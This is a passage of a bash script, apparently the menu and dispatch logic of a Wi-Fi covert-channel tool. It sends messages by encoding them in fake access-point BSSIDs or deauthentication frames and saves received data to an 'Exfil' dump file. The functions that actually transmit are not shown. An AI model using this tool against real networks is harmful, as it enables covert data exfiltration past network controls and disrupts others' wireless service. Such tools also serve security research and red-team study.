			if [ "$server_client_Mode" == "client" ] 
			then
			read -p "$(tput setaf 2)[>]:WIFI::Chat:input:[$(tput setaf 3)Client$(tput setaf 2)][$(tput setaf 3)BSSID$(tput setaf 2)]#$(tput setaf 11) " input
			else
			read -p "$(tput setaf 2)[>]:WIFI::Chat:input:[$(tput setaf 3)Server$(tput setaf 2)][$(tput setaf 3)BSSID$(tput setaf 2)]#$(tput setaf 11) " input		
			fi
		else

			if [ "$server_client_Mode" == "client" ] 
			then
			read -p "$(tput setaf 2)[>]:WIFI::Chat:input:[$(tput setaf 3)Client$(tput setaf 2)][$(tput setaf 3)DeAuth$(tput setaf 2)]#$(tput setaf 11) " input
			else
			read -p "$(tput setaf 2)[>]:WIFI::Chat:input:[$(tput setaf 3)Server$(tput setaf 2)][$(tput setaf 3)DeAuth$(tput setaf 2)]#$(tput setaf 11) " input
			fi
		fi	
		tput setaf 2
		if [[ $input == "@exit" ]]
			then
			exit ;
		elif [[ "$input" == "@clear"  ]] ;
			then
			clear ;
		elif [[ "$input" == "@help"  ]] ;
			then
			_help "$server_client_Mode" ;
		elif [[ "$input" == "@clientmode" || "$input" == "@cli" ]] ;
			then
			tput setaf 10
			echo "[@]:ChatMode::Client.Mode:On"
			tput setaf 2
			server_client_Mode="client"
		elif [[ "$input" == "@servermode" || "$input" == "@serv" ]] ;
			then
			tput setaf 10
			echo "[@]:ChatMode::Server.Mode:On"
			nohup killall airbase-ng > "killairbase.txt" 2>&1 & 
			tput setaf 2
			server_client_Mode="server"
		elif [[ "$input" == "@run" ]] ;
			then
				if [ "$server_client_Mode" == "server" ]
				then
					tput setaf 10
					if [ "$ExfilMode" == "bssid" ]
					then
					echo "[@]:ChatMode::ServerSide.[Bssid].Scanning.AccessPoints:Started"
					break;
					else
					echo "[@]:ChatMode::ServerSide.[DeAuth].Scanning.Mode:Started"
					break;
					fi
				else
				tput setaf 10
				echo "[@]:this command supported in [ServerSide] only"
				fi			
				tput setaf 2	
		elif [[ "$input" == "@dbgon" ]] ;
			then
			tput setaf 10
			echo "[@]:ChatMode::Debug.ShowDetails:On"
			tput setaf 2
			isdebug="on"
		elif [[ "$input" == "@dbgoff" ]] ;
			then
			tput setaf 10
			echo "[@]:ChatMode::Debug.ShowDetails:Off"
			tput setaf 2
			isdebug="off"
		elif [[ "$input" == "@bssid"  || "$input" == "bssid" ]] ;
			then
			tput setaf 10
			ExfilMode="bssid"		
			echo "[@]:ChatMode::SendbyBSSID:On"
			tput setaf 2
		elif [[ "$input" == "@deauth" ]] ;
			then
			tput setaf 10
			ExfilMode="deauth"		
			echo "[@]:ChatMode::SendbyDeAuth:On"
			tput setaf 2
		elif [[ $input != '' && $input != "@"*  && "$server_client_Mode" == "client" ]] ;
			then
			break;
		elif [[ $input != '' && $input == "@run"  && "$server_client_Mode" == "server" ]] ;
			then
			break;
			else 
			Again="Again;)"
			fi
		done

	if [ "$ExfilMode" == "bssid" ]
	then
		if [ "$server_client_Mode" == "client" ]
		then
			if [ "$isdebug" == "off" ]
			then
	   
			nohup killall airbase-ng > "kill.txt" 2>&1 &	
				while true ; 
				do
				read -p "$(tput setaf 2)[>]:WIFI::Monitor.Mode.[Interface]:input:[$(tput setaf 3)wlan0mon$(tput setaf 2)]#$(tput setaf 11) " input2
				if [ "$input2" != '' ]
				then
				break
				fi
				done
			sendBssids "$input" "fake" "$input2" "false"
			else
			nohup killall airbase-ng > "kill.txt" 2>&1 &	
				while true ; 
				do
				read -p "$(tput setaf 2)[>]:WIFI::Monitor.Mode.[Interface]:input:[$(tput setaf 3)wlan0mon$(tput setaf 2)]#$(tput setaf 11) " input2
				if [ "$input2" != '' ]
				then
				break
				fi
				done
			sendBssids "$input" "fake" "$input2" "true"
			fi
		else
			if [ "$isdebug" == "off" ]
			then
				while true ; 
				do
				read -p "$(tput setaf 2)[>]:WIFI::Wlan.[Interface]:input:[$(tput setaf 3)wlan0$(tput setaf 2)]#$(tput setaf 11) " input2
				if [ "$input2" != '' ]
				then
				break
				fi
				done
			receiveBssids  "$input2" "myExfildump.txt" "false"
			else
				while true ; 
				do
				read -p "$(tput setaf 2)[>]:WIFI::Wlan.[Interface]:input:[$(tput setaf 3)wlan0$(tput setaf 2)]#$(tput setaf 11) " input2
				if [ "$input2" != '' ]
				then
				break
				fi
				done
			receiveBssids  "$input2" "myExfildump.txt" "true"
			fi

		fi		
		
	fi		
	if [ "$ExfilMode" == "deauth" ]
	then
	   if [ "$server_client_Mode" == "client" ]
	   then
		if [ "$isdebug" == "off" ]
		then
				while true ; 
				do
				read -p "$(tput setaf 2)[>]:WIFI::Wlan.[Interface]:input:[$(tput setaf 3)wlan0$(tput setaf 2)]#$(tput setaf 11) " wlan_input2
				if [ "$wlan_input2" != '' ]
				then
				break
				fi
				done
				while true ; 
				do
				read -p "$(tput setaf 2)[>]:WIFI::Wlan.[Channel]:input:[$(tput setaf 3)1$(tput setaf 2)]#$(tput setaf 11) " channel_input3
				if [ "$channel_input3" != '' ]
				then
				break
				fi
				done
		ExfilDeauth "$input" "00:11:22:33:44:55" "$wlan_input2" "$channel_input3" "false"
		else
				while true ; 
				do
				read -p "$(tput setaf 2)[>]:WIFI::Wlan.[Interface]:input:[$(tput setaf 3)wlan0$(tput setaf 2)]#$(tput setaf 11) " wlan_input2
				if [ "$wlan_input2" != '' ]
				then
				break
				fi
				done
				while true ; 
				do
				read -p "$(tput setaf 2)[>]:WIFI::Wlan.[Channel]:input:[$(tput setaf 3)1$(tput setaf 2)]#$(tput setaf 11) " channel_input3
				if [ "$channel_input3" != '' ]
				then
				break
				fi
				done
		ExfilDeauth "$input" "00:11:22:33:44:55" "$wlan_input2" "$channel_input3" "true"
		fi
	   else
		if [ "$isdebug" == "off" ]
		then
				while true ; 
				do
				read -p "$(tput setaf 2)[>]:WIFI::WlanMon.[Interface]:input:[$(tput setaf 3)wlan1mon$(tput setaf 2)]#$(tput setaf 11) " wlanmon_input2
				if [ "$wlanmon_input2" != '' ]
				then
				break
				fi
				done
				while true ; 
				do
				read -p "$(tput setaf 2)[>]:WIFI::WlanMon.[Channel]:input:[$(tput setaf 3)1$(tput setaf 2)]#$(tput setaf 11) " channelmon_input3
				if [ "$channelmon_input3" != '' ]
				then
				break
				fi
				done
			ExfilDeauthDumps "" "$wlanmon_input2" "$channelmon_input3" "false"
		else
			while true ; 
				do
				read -p "$(tput setaf 2)[>]:WIFI::WlanMon.[Interface]:input:[$(tput setaf 3)wlan1mon$(tput setaf 2)]#$(tput setaf 11) " wlanmon_input2
				if [ "$wlanmon_input2" != '' ]
				then
				break
				fi
				done
				while true ; 
				do
				read -p "$(tput setaf 2)[>]:WIFI::WlanMon.[Channel]:input:[$(tput setaf 3)1$(tput setaf 2)]#$(tput setaf 11) " channelmon_input3
				if [ "$channelmon_input3" != '' ]
				then
				break
				fi
				done
			ExfilDeauthDumps "" "$wlanmon_input2" "$channelmon_input3" "true"
		fi

	   fi
	fi

	done	
fi
################################################## version 2 ##################################################
